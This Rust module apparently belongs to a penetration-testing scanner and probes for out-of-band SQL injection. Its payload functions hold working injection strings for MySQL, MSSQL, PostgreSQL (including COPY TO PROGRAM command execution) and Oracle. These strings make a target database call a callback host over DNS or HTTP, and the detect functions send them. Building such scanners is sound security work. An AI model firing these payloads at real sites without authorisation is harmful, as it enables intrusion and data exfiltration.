//! Out-of-Band (OOB) SQL Injection Detection
//!
//! Detects SQLi by forcing the database to make external connections.

use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::sqli::{DatabaseType, SqliResult, SqliTechnique};
use reqwest::Method;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use url::Url;

/// OOB payloads for different databases
pub struct OobPayloads;

impl OobPayloads {
    /// MySQL LOAD_FILE DNS exfil (Windows only)
    pub fn mysql_dns(callback: &str, token: &str) -> String {
        format!(
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{}.{}.{}','\\\\\\\\a'))-- ",
            token, "mysql", callback
        )
    }

    /// MSSQL xp_dirtree DNS exfil
    pub fn mssql_dns(callback: &str, token: &str) -> String {
        format!(
            "'; EXEC master..xp_dirtree '\\\\{}.{}.{}\\share';-- ",
            token, "mssql", callback
        )
    }

    /// PostgreSQL DNS exfil
    pub fn postgresql_dns(callback: &str, token: &str) -> String {
        format!(
            "'; COPY (SELECT '') TO PROGRAM 'nslookup {}.{}.{}';-- ",
            token, "pgsql", callback
        )
    }

    /// Oracle UTL_HTTP
    pub fn oracle_http(callback: &str, token: &str) -> String {
        format!(
            "' OR UTL_HTTP.REQUEST('http://{}/{}.oracle')='x'-- ",
            callback, token
        )
    }

    /// Oracle UTL_INADDR DNS
    pub fn oracle_dns(callback: &str, token: &str) -> String {
        format!(
            "' OR UTL_INADDR.GET_HOST_ADDRESS('{}.{}.{}')='x'-- ",
            token, "oracle", callback
        )
    }

    /// Generate a unique token for correlation
    pub fn generate_token() -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        let timestamp = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_millis();
        format!("anvil{:x}", timestamp)
    }

    /// Get all OOB payloads
    pub fn all(callback: &str, token: &str) -> Vec<(String, DatabaseType, &'static str)> {
        vec![
            (Self::mysql_dns(callback, token), DatabaseType::MySQL, "DNS"),
            (Self::mssql_dns(callback, token), DatabaseType::MSSQL, "DNS"),
            (Self::postgresql_dns(callback, token), DatabaseType::PostgreSQL, "DNS"),
            (Self::oracle_http(callback, token), DatabaseType::Oracle, "HTTP"),
            (Self::oracle_dns(callback, token), DatabaseType::Oracle, "DNS"),
        ]
    }
}

/// Detect OOB SQL injection
///
/// Note: This requires a callback server to receive the exfiltrated data.
/// The callback domain should be controlled by the tester.
pub async fn detect(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    callback_domain: &str,
) -> anyhow::Result<Option<SqliResult>> {
    let token = OobPayloads::generate_token();

    tracing::info!(
        "[OOB] Testing {} param={} with token={}",
        base_url,
        param,
        token
    );

    // Send all OOB payloads
    for (payload, db_type, oob_type) in OobPayloads::all(callback_domain, &token) {
        let mut url = base_url.clone();
        url.query_pairs_mut().append_pair(param, &payload);

        tracing::debug!("[OOB][{}] Sending {} payload", db_type, oob_type);

        let req = HttpRequest::new(Method::GET, url);
        let _ = client.execute(req).await; // We don't care about the response

        // Note: In a real implementation, we would check the callback server
        // for incoming DNS/HTTP requests with our token
    }

    // For now, we return None because we can't verify callbacks
    // A full implementation would integrate with an OOB listener
    tracing::info!(
        "[OOB] Payloads sent. Check callback server for: {}.*.{}",
        token,
        callback_domain
    );

    Ok(None)
}

/// OOB Listener for receiving callbacks
///
/// This is a placeholder for a full OOB listener implementation.
/// In production, this would:
/// 1. Start a DNS server on port 53
/// 2. Start an HTTP server on port 80
/// 3. Correlate incoming requests with sent tokens
#[derive(Debug)]
pub struct OobListener {
    callback_domain: String,
    callbacks: std::collections::HashMap<String, OobCallback>,
    running: Arc<AtomicBool>,
}

#[derive(Debug, Clone)]
pub struct OobCallback {
    pub token: String,
    pub db_type: Option<DatabaseType>,
    pub callback_type: OobCallbackType,
    pub data: Option<String>,
    pub timestamp: u64,
}

#[derive(Debug, Clone, Copy)]
pub enum OobCallbackType {
    Dns,
    Http,
}

impl OobListener {
    pub fn new(callback_domain: &str) -> Self {
        Self {
            callback_domain: callback_domain.to_string(),
            callbacks: std::collections::HashMap::new(),
            running: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Start the OOB listener (placeholder)
    pub async fn start(&mut self) -> anyhow::Result<()> {
        self.running.store(true, Ordering::SeqCst);
        tracing::info!("[OOB] Listener started for domain: {}", self.callback_domain);

        // In a full implementation:
        // - Start DNS server on port 53
        // - Start HTTP server on port 80
        // - Parse incoming requests and extract tokens

        Ok(())
    }

    /// Stop the OOB listener
    pub fn stop(&mut self) {
        self.running.store(false, Ordering::SeqCst);
        tracing::info!("[OOB] Listener stopped");
    }

    /// Check if a token has been received
    pub fn check_token(&self, token: &str) -> Option<&OobCallback> {
        self.callbacks.get(token)
    }

    /// Register a callback (called by listener when data received)
    pub fn register_callback(&mut self, callback: OobCallback) {
        tracing::info!(
            "[OOB] Callback received: token={} type={:?}",
            callback.token,
            callback.callback_type
        );
        self.callbacks.insert(callback.token.clone(), callback);
    }

    /// Wait for a specific token with timeout
    pub async fn wait_for_token(
        &self,
        token: &str,
        timeout_ms: u64,
    ) -> Option<OobCallback> {
        let start = std::time::Instant::now();
        let timeout = std::time::Duration::from_millis(timeout_ms);

        while start.elapsed() < timeout {
            if let Some(callback) = self.callbacks.get(token) {
                return Some(callback.clone());
            }
            tokio::time::sleep(std::time::Duration::from_millis(100)).await;
        }

        None
    }
}

/// Detect OOB SQLi with listener integration
pub async fn detect_with_listener(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    listener: &OobListener,
) -> anyhow::Result<Option<SqliResult>> {
    let token = OobPayloads::generate_token();

    // Send payloads
    for (payload, db_type, oob_type) in OobPayloads::all(&listener.callback_domain, &token) {
        let mut url = base_url.clone();
        url.query_pairs_mut().append_pair(param, &payload);

        let req = HttpRequest::new(Method::GET, url);
        let _ = client.execute(req).await;

        // Wait for callback
        if let Some(callback) = listener.wait_for_token(&token, 5000).await {
            return Ok(Some(SqliResult {
                endpoint: base_url.to_string(),
                parameter: param.to_string(),
                technique: SqliTechnique::OutOfBand,
                confidence: 0.95,
                db_type: callback.db_type.or(Some(db_type)),
                details: format!(
                    "OOB SQLi confirmed via {:?}. Token: {}. Data: {:?}",
                    callback.callback_type,
                    callback.token,
                    callback.data
                ),
            }));
        }
    }

    Ok(None)
}

